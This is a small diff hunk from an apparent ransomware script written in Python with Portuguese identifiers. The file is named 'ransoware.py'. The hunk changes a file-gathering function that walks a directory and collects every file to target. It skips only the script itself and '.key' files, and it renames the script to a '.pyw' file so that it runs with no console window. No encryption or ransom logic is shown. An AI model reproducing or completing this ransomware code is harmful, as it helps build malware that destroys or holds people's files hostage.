@@ -17,7 +17,7 @@ def encontrar_arquivos(diretorio):
     for raiz, _, arquivos in os.walk(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
-            if nome != "ransoware.py" and not nome.endswith(".key"):
+            if nome != "ransoware.pyw" and not nome.endswith(".key"):
                 lista.append(caminho)
     return lista 
 
